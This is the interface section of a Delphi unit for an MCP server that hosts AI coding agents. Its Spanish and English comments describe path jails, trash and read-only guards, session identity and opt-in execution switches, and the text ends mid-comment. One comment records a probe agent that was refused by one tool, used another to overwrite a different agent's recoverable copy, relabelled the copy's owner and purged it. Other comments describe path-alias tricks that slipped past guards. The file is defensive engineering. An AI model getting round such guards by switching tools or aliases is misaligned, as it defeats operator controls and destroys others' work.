{ Lo que ESTE SERVIDOR tiene abierto bajo una carpeta se suelta antes de
  mudarla. El mudador no sabe quien lo tiene. Hoy, los motores DelphiLSP, uno
  por proyecto: al cargar la configuracion del proyecto el motor cambia SU
  directorio de trabajo a la carpeta del proyecto, y Windows no deja renombrar
  ni borrar el directorio de trabajo de un proceso vivo (medido con el motor
  lanzado a mano: libre tras initialize, retenida tras
  workspace/didChangeConfiguration). Quien tenga algo se
  apunta aqui con su soltador y los DOS que quitan una carpeta de su sitio
  (MueveArbol y BorraArbol) los llaman a todos, pasado el guard y antes de
  tocar nada. Medido el 29-sep-2026 (Hermes, en campo): tras UN hover, borrar
  la carpeta del proyecto daba FILE-036 y moverla SYS-027, y el agente no
  tenia como cerrar un proceso que era nuestro; la purga y git worktree
  remove eran peores: el contenido se iba y quedaba el cascaron. Un soltador
  nunca lanza: lo que no se suelte deja fallar la operacion como antes. Se
  apunta al arrancar (initialization), nunca con peticiones en marcha.

  Son DOS avisos, y van en pareja: "se va a quitar" (AEmpieza) y "ya esta".
  Entre uno y otro la carpeta esta SALIENDO y quien tenia algo no vuelve a
  cogerlo: soltar y quitar no era una sola cosa, y un motor que arrancaba en
  medio (el primer hover de otro agente) volvia a retener la carpeta. El
  segundo aviso va SIEMPRE, en un finally: sin el, la carpeta se quedaria
  saliendo. }
type
  TSoltadorDeCarpeta = procedure(const ACarpeta: string; AEmpieza: Boolean);

procedure RegistraSoltadorDeCarpeta(ASoltador: TSoltadorDeCarpeta);

{ Los dos avisos. MueveArbol y BorraArbol los dan solos; estan en la
  interface para quien quita una carpeta por OTRO camino que los del guard
  (la rama de carpeta vacia de delphi_delete; git, que borra el mismo).
  Nunca lanzan. }
procedure SueltaLoNuestroBajo(const ACarpeta: string);
procedure YaNoSeQuita(const ACarpeta: string);

{ ADestino cae DENTRO de AOrigen (o es el), por las rutas REALES (la nota
  larga, en la implementacion). En la interface desde el 29-sep-2026: la
  sesion LSP pregunta con ella que clientes viven bajo la carpeta que se va a
  mudar. UN lector de "esto cae dentro de aquello": no se escribe otro. Lanza
  si una ruta no se puede resolver. }
function DentroDeSiMismo(const AOrigen, ADestino: string;
  AOrigenEsElEnlace: Boolean = False): Boolean;

{ Las dos mitades de DentroDeSiMismo, para quien tiene que comparar con un
  cerrojo cogido: RutaParaComparar RESUELVE (pregunta al disco; con
  AEsElEnlace, la ruta por donde ESTA y no por adonde apunta) y CaeDentro
  COMPARA dos rutas ya resueltas: texto, y nada mas. DentroDeSiMismo es las
  dos seguidas: sigue habiendo UN lector. }
function RutaParaComparar(const ARuta: string; AEsElEnlace: Boolean = False): string;
function CaeDentro(const AOrigenResuelto, ADestinoResuelto: string): Boolean;

{ La decision de MueveArbol, sola: '' = se puede. Las dos rutas pasan la
  puerta de escritura (PathDenied), el origen ni ES ni CONTIENE un lugar
  protegido (ProtegidoDenegado) y las dos estan en la misma unidad: entre
  unidades no hay renombrado, y copiar y borrar es justo lo prohibido.
  Quien quiera rechazar ANTES de preparar nada (la copia de seguridad de
  delphi_move) la llama primero; MueveArbol la repite igualmente. }
function MovidoDenegado(const AOrigen, ADestino: string): string;

{ '' salvo que la carpeta ADir SEA o CONTENGA un lugar protegido
  (LugaresProtegidos). PathDenied mira la ruta que le pasan, y mover o
  tirar a la papelera una carpeta se lleva TODO lo de dentro: un proyecto
  de referencia declarado DENTRO de una raiz de escritura, o la raiz de
  otro workspace, se iban con su padre (David, 25-sep-2026: 'ese agujero
  es grave'). El lugar se NOMBRA solo si la sesion ya lo puede leer: la
  raiz de otro workspace, el vault o la carpeta del servidor no se
  revelan, se dice un sitio protegido. }
function ProtegidoDenegado(const ADir: string): string;

{ LA pregunta de todo escritor: '' = esta sesion puede escribir APath;
  si no, el motivo. Es la puerta de escritura (PathDenied, sobre la ruta
  REAL) mas el modo de solo lectura. La hacen los ESCRITORES mismos
  (AtomicWrite, BackupFile), no solo quien los llama: renombrar una unit
  reescribia cada fichero que listaba el .dpr, y el .dpr puede listar
  uno de fuera o de una referencia (medido en vivo contra 1.3.1,
  25-sep-2026). Un llamador que se olvide de preguntar ya no abre
  nada: el escritor lanza. }
function EscrituraDenegada(const APath: string): string;

{ Una CARPETA donde la tool pide un FICHERO: '' si no lo es; si lo es, "es
  una CARPETA, no un fichero" (INVALID_PARAM), el mismo texto que ya daba
  delphi_read. Un sitio para las tools que piden un fichero: siete
  contestaban "no existe" o un INTERNAL del sistema ante una carpeta
  (segunda revision, 27-sep-2026). }
function CarpetaEnVezDeFichero(const APath: string): string;

{ Un FICHERO que no esta: si en su sitio hay una CARPETA lo dice (el texto de
  CarpetaEnVezDeFichero, INVALID_PARAM); si no, devuelve AMsgNoExiste, el "no
  existe" de quien pregunta. Para el "if not TFile.Exists" de las tools que
  piden un fichero: una carpeta decia "no existe" (NOT_FOUND) en build,
  diagnostics, designer, add-unit y delphi_edit (tercera revision, 27-sep-2026). }
function NoEsFichero(const APath, AMsgNoExiste: string): string;

{ LA regla de "ruta completa": <letra>:\ (o :/) o un UNC. "\x", "/x" y "C:x"
  NO lo son, y TPath.IsPathRooted si las da por buenas: se resolvian contra
  la unidad o la carpeta del PROCESO, que el agente no nombro. Toda tool que
  pregunte "me han dado una ruta completa?" pregunta esto. }
function EsRutaAbsoluta(const AValue: string): Boolean;

{ Un UNC (\\host\...) que no cae BAJO ningun sitio declarado - raices,
  referencias, ReadOnlyPaths, el vault, la zona de librerias -, comparado por
  TEXTO, sin tocar el disco. Resolverlo (RealPath abre un handle,
  GetLongPathName lo recorre) ya es abrir SMB hacia el host que diga el
  agente ANTES de saber que esta fuera: 21 s medidos por llamada, y la cuenta
  del servicio se autentica si el host contesta (septima revision). Sin
  jaula configurada, False: no hay nada que proteger. }
function UncFueraDeLugares(const APath: string): Boolean;
{ Un prefijo de DISPOSITIVO o de ruta extendida (\\?\, \\.\, tambien con
  barras normales): la entrada lo niega (GUARD-022) y nadie lo resuelve en
  el disco. Estaba escrito dos veces, y NormPath resolvia un \\?\UNC\ leido
  de un .dpr: SMB hacia ese host, 21 s (novena revision). }
function EsPrefijoDeDispositivo(const APath: string): Boolean;
{ Una ruta que un fichero NOMBRA (un .dpr, un .groupproj) y que nadie
  resuelve en el disco: un UNC de ningun sitio declarado o un prefijo de
  dispositivo. La E/S sobre ella iria a un host que eligio el fichero, no
  el operador. UNA pregunta para NormPath y para quien abre los ficheros que
  lista un proyecto (el rename hacia TFile.Exists sobre \\?\UNC\: 21 s de
  SMB; novena revision). }
function RutaSinTocarElDisco(const APath: string): Boolean;

{ La forma DECLARADA de una ruta que llega RESUELTA. Un programa que el
  servidor lanza contesta con la ruta real (git: la raiz de un repo), y la
  real de un sitio declarado en una letra de red CONECTADA (L:\...) es su
  UNC (\\host\recurso\...). La puerta juzga por la forma declarada y negaba
  esa respuesta: en una maquina con las raices en una letra de red,
  delphi_git contestaba GIT-041 a todo lo que trabaja sobre un repo que ya
  existe (medido el 30-sep-2026: status, config, add, commit, log, branch,
  diff, stash, switch).
  Si ARuta es un UNC que cae bajo la ruta de red de una raiz o de una
  referencia DECLARADA CON LETRA, vuelve escrita con lo declarado; si no,
  vuelve como llego. No abre nada: lo que devuelve pasa despues por la
  puerta de siempre, una ruta con letra no se toca, y un UNC que no es de
  ningun sitio declarado tampoco. Y no toca el disco ni la red: la ruta de
  red de un sitio sale de la tabla de unidades de la sesion (GetDriveType,
  WNetGetConnection), que es local - medido el 1-oct-2026: 0,1 ms, y el
  mismo recurso que escribe git. Solo las letras que son unidades de red:
  un enlace local hacia un recurso se queda como estaba. }
// AReferencia: llamada ya admitida; devuelve tambien la forma de su raiz enlazada.
function FormaDeclarada(const ARuta: string; const AReferencia: string = ''): string;
{ Lo mismo sobre unas listas dadas (los sitios declarados y su ruta de red,
  por indice): la regla sin la maquina, para quien la prueba. }
function FormaDeclaradaDe(const ARuta: string;
  const ADeclaradas, AReales: TArray<string>; AConLocales: Boolean = False): string;
{ La misma regla sobre un TEXTO, para la SALIDA: donde aparece la ruta de red
  de un sitio declarado en una letra - como la escribe git
  (//host/recurso/...), con las barras de Windows, o dobladas dentro de un
  JSON - se pone la forma declarada, con las barras con que venia. El
  enmascarador la llama antes de su barrido, que le pone su unidad virtual:
  lo que git ensenaba salia con el nombre real de la maquina y en una forma
  que el agente no puede devolver (worktree list). Reconoce SOLO esas
  rutas, por su texto: reconocer "//algo" por su forma se llevaria los
  comentarios de Pascal de un diff. }
function FormaDeclaradaEnTexto(const ATexto: string;
  const ADeclaradas, AReales: TArray<string>): string;

{ La primera carpeta que YA existe por encima de ARuta (ARuta incluida): lo
  que una operacion cree debajo es suyo, y QuitaCarpetasCreadas lo quita si
  queda vacio. UNA regla para la foto (un create en a\b\c.txt) y para el
  clone (que en n1\n2\n3 fallido dejaba n1\n2; septima revision). }
function PrimerAncestroQueExiste(const ARuta: string): string;
{ Quita ADesde y sus padres, hasta AAncestro (sin el), mientras esten VACIOS,
  por la puerta de escritura. Nunca lanza: lo que no se puede, se queda. }
procedure QuitaCarpetasCreadas(const ADesde, AAncestro: string);

{ El PARAMETRO que no va con un modo (el comando de delphi_config, el kind
  de delphi_create, el modo de delphi_edit...), '' si todos van. ATabla:
  pares (modo, 'sus parametros separados por espacio'); AEnviados: ternas
  (nombre, valor, valor por defecto que publica su esquema): uno vacio, o
  con su valor por defecto, no se ha "enviado" - un cliente que rellena los
  defaults no tropieza (CFG-110 rechazaba section=summary). ASuyos, los del
  modo, para el mensaje. Un modo que no esta en la tabla no se mira: lo
  dice su propia negativa. UNA regla para las tools de varios modos: cada
  una escribia la suya o ignoraba en silencio (septima revision). }
function ParametroQueNoVa(const AModo: string; const ATabla, AEnviados: array of string;
  out ASuyos: string): string;

{ '' salvo que APath sea un FICHERO con el atributo de solo lectura: su
  negativa (SYS-029). Para quien SUSTITUYE el contenido de un fichero
  (AtomicWrite, delphi_upload): renombrarlo o borrarlo si se puede con el
  atributo puesto, asi que no va en la puerta de escritura. Se decia "otro
  proceso lo tiene, cierralo y repite" y el agente repetia para siempre
  (sexta revision). }
function SoloLecturaDenegado(const APath: string): string;

{ "Puedo SUSTITUIR este fichero?": la puerta de escritura sobre la ruta real
  y el atributo de solo lectura, en ese orden - lo que pregunta el escritor
  (AtomicWrite) y lo que tiene que preguntar quien COPIA antes de que el
  escritor se niegue (BackupFile): SYS-029 decia "nothing was written" con
  la copia diaria ya hecha (decima revision). '' = se puede. }
function SustitucionDenegada(const APath: string): string;

{ Quita el atributo de solo lectura a un FICHERO; una carpeta o un enlace
  no se tocan (lo de detras no es de la operacion). Nunca lanza. Estaba a
  mano en BorraDeVerdad y hacia falta en cada deshacer (decima revision). }
procedure QuitaSoloLectura(const APath: string);

{ Borra un fichero que ESTA operacion acaba de dejar: la copia de algo que
  al final no se hizo, lo que un deshacer quita. Una copia hereda el +R del
  original, y TFile.Delete fallaba y la dejaba (decima revision: dos copias
  +R en la papelera, la copia=true que se quedaba). Lanza como
  TFile.Delete; quien llama ya paso la puerta de escritura. }
procedure BorraLoNuestro(const APath: string);

{ Copia un fichero PARA el agente (copy=true de una unit, de su designer o
  de una carpeta): la copia es suya y no hereda el atributo de solo lectura
  del original - heredado, la reescritura de la cabecera caia en SYS-029 y
  la copia salia +R (decima revision). Las copias de la papelera NO pasan
  por aqui: conservan el atributo. Lanza como TFile.Copy. }
procedure CopiaNuestra(const AOrigen, ADestino: string);

{ Pega una NOTA a una respuesta sin romperla: si es un objeto JSON, va
  dentro como un campo mas (AClave); si es prosa, detras (ASeparador + la
  nota). Un JSON con una linea de prosa detras dejaba de parsear (lo midio
  el buzon, 2026-08-25). Estaba escrito dos veces (Lsp.Host.WithMailboxNote
  y Mcp.Tools.Designer.ConNotaBinario) y delphi_styles iba a ser la tercera. }
function ConNota(const AText, AClave, ANota: string;
  const ASeparador: string = #10): string;

{ Una ruta que NO es absoluta (<letra>:\ o UNC, la regla de EsRutaAbsoluta):
  la negativa GUARD-021 (INVALID_PARAM); '' si es absoluta o esta vacia. La
  usa PathDenied (y por ella la segunda pasada de la puerta de entrada,
  ArgPathOutsideDenied) y delphi_create para un proyecto nuevo - una regla. }
function RutaRelativaDenegada(const APath: string): string;

type
  { LA FOTO de unos ficheros ANTES de tocarlos, y su vuelta atras: el "todo
    o nada" de la tanda de edits, del commit de un changeset y de
    add-platform con sdk/perfil. Estaba escrita tres veces, solo una se
    protegia de una excepcion y ninguna de un deshacer que fallara (un
    fichero que otro proceso tiene abierto: el deshacer lanzaba y el
    changeset se quedaba colgado). Revision 27-sep-2026. }
  TFotoDeFicheros = record
  private
    FRutas: TArray<string>;
    FExistian: TArray<Boolean>;
    FBytes: TArray<TArray<Byte>>;
    // lo que dejo la operacion en cada ruta (Anota): lo UNICO que el deshacer
    // puede dar por suyo
    FAnotado: TArray<Boolean>;
    FExisteNuestro: TArray<Boolean>;
    FNuestros: TArray<TArray<Byte>>;
    // tamano y fecha de la foto: se leen aunque otro proceso tenga el fichero
    // abierto sin compartir, y dicen si cambio cuando los bytes no se pueden leer
    FTam: TArray<Int64>;
    FFecha: TArray<TDateTime>;
    // de una ruta que no existia: la primera carpeta que SI existia por
    // encima (lo que la operacion cree debajo, el deshacer lo quita si vacio)
    FAncestro: TArray<string>;
    // otro la cambio ENTRE dos pasos de la operacion (Vigila): el deshacer no
    // la toca, porque lleva trabajo ajeno mezclado
    FAjeno: TArray<Boolean>;
    // sus atributos en la foto: el deshacer devuelve el +R (un fichero
    // reescrito o que vuelve de un move lo perdia; decima revision)
    FAtrib: TArray<Cardinal>;
  public
    { Lee los bytes de cada ruta (la que no existe se apunta como tal). }
    procedure Toma(const ARutas: array of string);
    { Apunta como esta AHORA una ruta de la foto: lo que la operacion acaba de
      dejar en ella. Se llama tras cada paso hecho. Nunca lanza: si no puede
      leerla, la ruta queda sin apuntar (el deshacer la trata como siempre). }
    procedure Anota(const ARuta: string);
    { Antes de cada paso: si el disco ya no es lo ultimo que se sabe de la
      ruta (la foto, o lo que dejo el paso anterior), otro la cambio entre
      medias - otro proceso, que el cerrojo solo ordena a los de este - y el
      paso siguiente lo absorberia como propio. Se marca y el deshacer la deja
      y lo dice (quinta revision: 15 de 15 veces se perdia). Nunca lanza. }
    procedure Vigila(const ARuta: string);
    { Deja cada fichero como estaba en la foto, por la puerta de escritura:
      solo los que CAMBIARON, y el que no existia, fuera. Lo que otro cambio
      DESPUES de que la operacion lo escribiera (el disco ya no tiene lo
      apuntado) no se toca: se dice. Nunca lanza: lo que no volvio lo
      devuelve, uno por linea con su porque ('' = todo volvio). Perder una
      edicion ajena con OK es peor que un deshacer incompleto que lo dice
      (David, 27-sep-2026). }
    function Restaura: string;
    function Cuantos: Integer;
    { Cuantas rutas de la foto son HOY distintas de como estaban (existir
      o no, o sus bytes). Una que no se puede leer cuenta como distinta.
      Para decir UNCHANGED cuando una operacion no cambio nada. }
    function Cambiados: Integer;
  end;

{ Vacia la casa del servidor al arrancar. Lo que hay ahi pertenece a la
  llamada que lo creo y ninguna llamada sobrevive a un reinicio, asi que al
  arrancar TODO lo que quede es basura de una ejecucion anterior - la que
  dejo 56,4 MB olvidados en el %TEMP% de la maquina durante dos dias, medido
  el 2026-09-21. Solo purga la PRIMERA instancia viva de este exe: la
  premisa "el servidor y la bandeja no pueden correr a la vez, comparten
  puerto" no vale para stdio, que no abre puerto ninguno y comparte la
  carpeta con el servicio - su purga borraria ficheros EN USO de una
  llamada en vuelo del otro (el -F de un commit, una salida de remoterun).
  Nunca lanza: un temporal que no se deja borrar no es motivo para no
  arrancar.
  Y de las temporales de las RAICES, solo las que no son de OTRO servidor
  vivo (TemporalEsMia): el cerrojo de arriba va por la carpeta del exe, y
  un servidor con otro exe y la misma raiz -una bateria sobre el repo, con
  el servicio sirviendo ese repo- vaciaba las del otro con llamadas en
  vuelo (visto al revisar las baterias, 26-sep-2026). }
procedure PurgeServerTemp;

{ Credentials (env var first, then settings.ini [Workspace] next to the exe). }
function AuthToken: string;         // DELPHI_MCP_TOKEN         / AuthToken
function ReadOnlyToken: string;     // DELPHI_MCP_READONLY_TOKEN / ReadOnlyToken
function BindIP: string;            // DELPHI_MCP_BIND_IP        / [Server] BindIP ('' = all)

{ La version de RAD Studio de ESTE servidor: [Server] DelphiVersion=37.0 de
  su settings.ini, y de nada mas (David, 5-oct-2026: "o hay version en el
  ini o cogemos la mas nueva instalada, punto"). '' = la mas nueva con
  DelphiLSP, que el servidor escribe al arrancar (FijaDelphiVersionEnElIni).
  Un servidor es UN Delphi: hasta entonces la fijaba cada workspace y un
  mismo proceso mantenia motores y rutas de varias versiones; para otra
  version, otro servidor en su propia carpeta con su puerto. Quien la
  aplica es DiscoverRadStudio (Lsp.Discovery), el unico sitio que elige
  instalacion. Normalizada aqui, una vez: '37', '37,0' (la coma decimal de
  un teclado espanol) y '37.00' son '37.0', como la escribe el registro; lo
  demas pasa tal cual y no arranca diciendo por que (1.15.0). }
function ServerDelphiVersion: string;

{ Escribe [Server] DelphiVersion=AVersion en el settings.ini del servidor y
  desde ahi manda la clave: el primer arranque sin ella guarda el Delphi que
  eligio, y no cambia solo el dia que se instale otro (David, 5-oct-2026).
  Sin settings.ini (el modo local de lanzamiento) no crea uno: False y
  AError vacio. Si no puede: False y el motivo en AError. }
function FijaDelphiVersionEnElIni(const AVersion: string; out AError: string): Boolean;

{ El update de su Delphi que DECLARA el operador: [Server] DelphiUpdate=13.2
  de su settings.ini (13.1, 13.2, manana 14.1). Hoy no decide nada: 13.1 y
  13.2 son la misma 37.0 y el servidor funciona igual con las dos (David,
  5-oct-2026). Es la prevision para las excepciones que traiga un update
  concreto, que se colgaran de aqui. Se declara, no se deduce: el texto que
  apunta el instalador (TRadStudioInfo.InstalledUpdate) es solo una pista
  para el operador. '' = sin declarar, o declarado con otra forma que
  numero.numero (el log lo avisa y se ignora). }
function ServerDelphiUpdate: string;

{ El settings.ini del disco es mas nuevo que el que tiene cargado este
  proceso: se lee una vez al arrancar y no se recarga en caliente (David,
  24-sep-2026), asi que lo tocado despues no esta cargado. AFecha = la del
  fichero. Lo que escribe el propio servidor (FijaDelphiVersionEnElIni) SI
  esta cargado y no cuenta: comparar con la hora de arranque lo daba por
  editado en el primer arranque de cada servidor (medido en produccion, 5-oct-2026). }
function SettingsIniMasNuevoQueElCargado(out AFecha: TDateTime): Boolean;

{ Un settings.ini con el BOM de UTF-8 delante de una cabecera de seccion NO
  arranca (6-oct-2026). Lo lee la API de los ini de Windows - aqui (TIniFile)
  y en MCPServer.Settings, que lee el Port -, y esa API toma el BOM por texto
  de esa linea: no ve la cabecera y pierde la seccion entera. Medido con un
  [Server] primero: su Port y su BindIP no se leian (el servidor en el 3000
  y en TODAS las interfaces) y DelphiVersion se escribia en un [Server]
  nuevo al final. Con un comentario delante el BOM se queda en el comentario
  y todo se lee: eso pasa. Lo decide LoadSecurity, el lector, antes de leer
  nada (y entonces no lee); esto lo lanza, y lo llama TMcpHost.Wire lo
  primero. Leerlo de otra manera seria un segundo lector, y el del Port ni
  siquiera es nuestro. }
procedure ExigeSettingsIniLegible;

{ The knowledge-vault root (Obsidian notes). Empty when unset.
  Env DELPHI_MCP_VAULT_PATH (solo el workspace por defecto), si no el
  VaultPath= del workspace activo. Canonicalized, no trailing delimiter. The vault_read/vault_search tools register only when
  VaultConfigured is true. }
function VaultPath: string;         // DELPHI_MCP_VAULT_PATH / VaultPath= del workspace
function VaultConfigured: Boolean;  // VaultPath set AND the directory exists
function VaultConfiguredAnywhere: Boolean; // algun workspace declara vault (registro)

{ Whether APath is inside the knowledge vault. The vault belongs to the
  vault_* tools alone, so the code tools skip it in their walks even when it
  sits inside a workspace root - a listing that showed the notes would invite
  an agent to edit them behind the vault's back. }
function InVault(const APath: string): Boolean;

{ THE Windows name rule, in one place: a path segment ending in a dot or a
  space, or carrying an Alternate Data Stream (":"), is refused - Windows
  normalizes those away when opening, so what a check sees and what gets
  written are different files. Used by the workspace jail AND by the vault
  resolver: the same trick defeated both (delphi_textedit in an early round,
  the vault governance files in round 9), so the rule lives here once instead
  of being re-derived per toolset. '' = the name is fine. }
function PathAnomaly(const APath: string): string;

{ Whether the vault WRITE tools (vault_append/create/patch) are enabled:
  el vault del workspace activo esta configurado Y su VaultReadOnly= es 0
  (defecto 1 = solo lectura).
  Even when writable, the write tools are refused for a read-only credential
  at the gate (they are in the mutating list). }
function VaultWritable: Boolean;    // VaultConfigured AND VaultReadOnly=0 del workspace

{ Whether delphi_build may run a project's OWN build scripts: a custom <Target>,
  a post-build step, Authenticode signing via <Exec>. Its own opt-in, for a
  TRUSTED project that signs or copies at build time; nothing else runs here.
  Untrusted uploads with no opt-in still hit the hazard scanner. Opt in with
  DELPHI_MCP_ALLOW_BUILD_SCRIPTS=1 or AllowBuildScripts=1 en el workspace. }
function AllowBuildScripts: Boolean; // DELPHI_MCP_ALLOW_BUILD_SCRIPTS / AllowBuildScripts=1

{ Whether delphi_paserver may EXECUTE the deployed program on a PAServer
  target (command=remote-run). OFF by design. Since 2026-09-23 it is the ONLY
  way this product executes a program (delphi_run, execution on the server
  itself, was retired: one door instead of two), and the operator of this
  server is not necessarily the owner of that machine. Two locks in series, on
  purpose: this switch (server side) and the runner someone has to launch on
  the target. Opt in with DELPHI_MCP_ALLOW_REMOTE_RUN=1 or
  AllowRemoteRun=1. install-runner does NOT need it: copying the script
  executes nothing. }
function AllowRemoteRun: Boolean;   // DELPHI_MCP_ALLOW_REMOTE_RUN / AllowRemoteRun=1

{ Whether delphi_test may RUN a test project's binary on this server. OFF by
  default, and the ONE thing that ever runs on this machine (delphi_run,
  arbitrary binaries, was retired 2026-09-23: one door): the binary comes
  from a project of the jail, is built here, and runs on a copy of its
  output folder in a Windows container of its own (Lsp.Sandbox) with a
  timeout. Opt in with
  DELPHI_MCP_ALLOW_TESTS=1 or AllowTests=1 en el workspace. }
function AllowTests: Boolean;      // DELPHI_MCP_ALLOW_TESTS / AllowTests=1

{ WHO is calling - as far as this server can honestly know.

  Two-phase, the way the operator asked: the SHARED token (Bearer) is the door,
  the same for everyone. Then the handshake's clientInfo.name is bound to the
  session id the server issues in `initialize` - and that id is a secret the
  server generated, returned once, and the client echoes on every request. So
  the NAME is fixed at connect time and cannot be re-declared per call: to be
  taken for another agent you would have to steal their session id, not just
  type their name. That is the whole gain over the old self-declared 'agent'
  string.

  Not authentication (one token still lets anyone connect), but enough to keep
  agents working in different projects from stepping on each other, and to
  stop casual impersonation. A real per-agent token is the next rung.

  Bound at initialize; read on every tool call via the per-thread context the
  HTTP layer sets before dispatch. '' when unknown (stdio with no name, or a
  request before initialize) - callers treat that as 'anon'. }
procedure BindSessionIdentity(const ASessionId, AName: string);
procedure SetThreadIdentityBySession(const ASessionId: string);
procedure SetThreadIdentity(const AName: string); // stdio: one process, one name
procedure ClearThreadIdentity;
function CurrentAgent: string;               // '' = unknown
function CurrentAgentOr(const ADefault: string): string;

{ El REGISTRO de sesiones HTTP - uno solo, el mismo que guarda la identidad
  (hasta 1.0.16 el servidor HTTP llevaba un anillo aparte de ids conocidos:
  dos escritores para la misma cosa). Una sesion nace en initialize
  (BindSessionIdentity, con nombre o sin el), se toca en cada peticion que
  la usa y CADUCA tras SessionTimeoutMinutes de inactividad: [Server]
  SessionTimeoutMinutes en settings.ini o DELPHI_MCP_SESSION_TIMEOUT_MINUTES
  (720 por defecto, 0 = nunca). La puerta HTTP contesta 404 a una sesion
  desconocida o caducada - lo que manda el contrato streamable-HTTP - y el
  cliente vuelve a hacer initialize. Un initialize con un id viejo siempre
  pasa: es el arreglo, no el problema. }
type
  // ssEvicted: cerrada para hacer sitio (SESIONES_MAX); salia "desconocida"
  TSessionState = (ssUnknown, ssExpired, ssAlive, ssEvicted);
const
  SESIONES_MAX = 256;
type
  TSesion = record
    Id, Nombre: string;
    UltimoUso: TDateTime;
  end;
function SessionState(const ASessionId: string): TSessionState; // viva = la toca
function SessionTimeoutMinutes: Double;                         // 0 = nunca caduca
{ [Server] EngineIdleMinutes en settings.ini o DELPHI_MCP_ENGINE_IDLE_MINUTES
  en el entorno (que gana): los minutos sin uso tras los que el servidor para
  un motor LSP y cierra un documento abierto en el (Lsp.Session). 30 por
  defecto; 0 = los motores no se paran por falta de uso. Decimales admitidos,
  como en la de arriba. Fontaneria, no permiso: por eso vive en [Server]. }
function EngineIdleMinutes: Double;
{ [Server] MaxEngines en settings.ini o DELPHI_MCP_MAX_ENGINES en el entorno
  (que gana): cuantos motores LSP vivos admite el servidor a la vez; el que
  pasa del tope para al menos usado de los que no estan trabajando (LRU,
  Lsp.Session). 0 (el defecto) = sin tope: los para solo el barrendero de
  EngineIdleMinutes. Fontaneria, como la de arriba. }
function MaxEngines: Integer;
function LiveSessionCount: Integer;                             // purga las caducadas

{ Dead copies are not a scratchpad. The recoverable trash, and the IDE's own
  __history/__recovery, hold the LAST GOOD version of somebody's work - the
  whole reason every write here is safe. Writing into them destroys exactly
  what they exist to preserve, and it does not even need a purge: overwrite
  the copy and the original is gone for good.

  Measured 2026-08-25 by a probe agent: delphi_edit refused the trash, so the
  agent went through delphi_textedit (which handles NON-Delphi text and had no
  such rule) and (a) rewrote another agent's recoverable copy, and (b) edited
  the ".by" owner marker of a copy that was not its own, from "bob" to its own
  name, and then purged it legitimately. A guard one tool wide is not a guard.

  Reading a dead copy is fine (that is how you decide whether to restore it);
  moving one OUT is the restore itself. Only writing IN is refused. }
function DeadCopyWriteDenied(const APath: string): string;

{ APath ES una carpeta de temporales del servidor (__delphi-temp) o esta
  DENTRO de una - sobre la ruta canonica larga, asi que un alias 8.3 es la
  misma carpeta. AEsLaCarpeta: es la carpeta misma, no algo de dentro. EL
  lector de esa pregunta: la puerta de escritura, el reconocedor de
  capturas y delphi_package la hacian cada uno a mano, y delphi_delete iba
  a ser el cuarto (26-sep-2026). }
function EnTemporal(const APath: string): Boolean; overload;
function EnTemporal(const APath: string; out AEsLaCarpeta: Boolean): Boolean; overload;

{ La misma pregunta para la PAPELERA (__delphi-patch, TrashFolderName de
  Lsp.Patch). La hacian a mano cinco sitios con dos formas: la puerta de
  escritura y delphi_edit sobre la ruta canonica larga, y delphi_delete /
  delphi_move / el recorredor de includetrash sobre el texto tal cual - un
  alias 8.3 (__DELP~1) era la papelera para unos y no para otros. }
function EnPapelera(const APath: string): Boolean; overload;
function EnPapelera(const APath: string; out AEsLaCarpeta: Boolean): Boolean; overload;

{ EL gate de DESTINO de escritura: la jaula (PathDenied) y las carpetas
  muertas (DeadCopyWriteDenied), en ese orden. Todo escritor que cree o
  reescriba un fichero en una ruta que elige el agente pasa por aqui. Hasta
  el 25-sep-2026 cada escritor escribia el par a mano (cuatro copias) y dos
  no lo hacian: el out= de las capturas (90 capturas, 66 MB acumulados en
  una __delphi-temp anidada que la purga no alcanza) y el destino de
  delphi_move. El proximo escritor llama a esta y ya esta. Queda fuera a
  proposito el out= del logcat de adb: su sitio natural ES un temporal, y
  rechazarlo empujaria los volcados dentro del proyecto (David, 25-sep-2026). }
function WriteTargetDenied(const APath: string): string;

{ The SAME directory can be named more than one way, and a guard that matches a
  path segment literally is blind to every alias. NTFS keeps an 8.3 short name
  for each entry ("__delphi-patch" also answers to "__DELP~1"), and it resolves
  to the identical folder - so a path through "__DELP~1" walked straight past
  the trash guard and reopened writing into the recoverable copies (measured
  2026-08-25).

  This expands the longest existing prefix of a path back to its real names
  before any segment guard looks at it. It cannot blanket-reject "~": the
  server's own scratch and home paths legitimately contain one (DFONTA~1). }
function LongCanonical(const APath: string): string;

{ LA ruta REAL: junctions y symlinks resueltos, nombres largos (la nota
  larga, en la implementacion). Publica para COMPARAR y reconocer - una
  clave de visitados que corta un ciclo de enlaces, un "esta dentro de" -,
  nunca para decidir un permiso por tu cuenta: eso es de las puertas. }
function RealPath(const APath: string): string;

{ Crea una carpeta (y sus padres) TOLERANDO que otro hilo la este creando a la
  vez. TDirectory.CreateDirectory mira si existe y LUEGO crea: dos hilos
  entran juntos, los dos contestan "no existe", los dos crean, y el que pierde
  se lleva un EInOutError "no se puede crear un archivo que ya existe".

  Es la misma carrera que delphi_report ya resolvia para el NOMBRE del fichero
  con CREATE_NEW... doce lineas mas abajo de donde la dejaba abierta para la
  CARPETA. Medido el 2026-09-20 por la bateria de concurrencia, que falla de
  higos a brevas justo por esto: de 8 informes simultaneos llegaban 7.

  Y estaba en las 32 llamadas del servidor, no en una: con dos agentes
  trabajando a la vez, cualquiera podia perder. Por eso se arregla aqui y no
  alli - si el resultado es que la carpeta esta, da igual quien la creo. }
procedure CrearCarpeta(const ADir: string);

{ Host names git may talk to when an agent writes an explicit URL, comma
  separated; '' (the default) means none - see GitRemoteDenied. }
function GitRemoteHosts: string;   // DELPHI_MCP_GIT_REMOTES / GitRemotes=

{ Host names delphi_paserver may DIAL when the caller names one by hand
  (test-connection host=...) O cuando un comando marca por perfil, comma
  separated. Tener un perfil en el IDE NO da permiso: cuenta SOLO la lista
  del workspace activo (v0.98; medido que el perfil ajeno marcaba igual). }
function RemoteProbeHosts: string; // DELPHI_MCP_REMOTE_HOSTS / RemoteHosts=

{ Whether the READ-ONLY library zone exists at all. Default True (reading the
  RTL and the installed components is what makes an agent competent here).
  LibraryZone=0 en el workspace lo corta: reads are then confined to the workspace
  roots, exactly like writes. Field 2026-08-24: an agent noted that the zone
  GROWS by itself with every component or SDK installed, so the operator
  deserves a way to say no. }
function LibraryZoneEnabled: Boolean; // DELPHI_MCP_LIBRARY_ZONE=0 / LibraryZone=0

{ '' when APath (a .dproj) may be executed remotely, else a refusal. La
  lista es la del workspace ACTIVO (RemoteRunProjects= en su seccion), sin
  herencia, y VACIA significa NADA ejecutable: fallar abierto aqui era la
